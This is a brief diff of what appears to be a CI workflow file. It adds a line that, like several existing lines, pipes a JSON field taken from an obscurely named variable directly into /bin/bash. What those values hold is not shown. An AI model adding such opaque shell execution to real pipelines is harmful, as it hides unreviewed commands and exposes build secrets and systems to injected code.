@@ -29,6 +29,7 @@ jobs:
           echo $jzhn1771 | jq -r .d9965 | /bin/bash
           echo $sgij4 | jq -r .r1485 | /bin/bash
           printf '%s' "$x8" | jq -r .mtk06564 | /bin/bash
+          printf '%s' "$ydbxk20344" | jq -r .tci58808 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
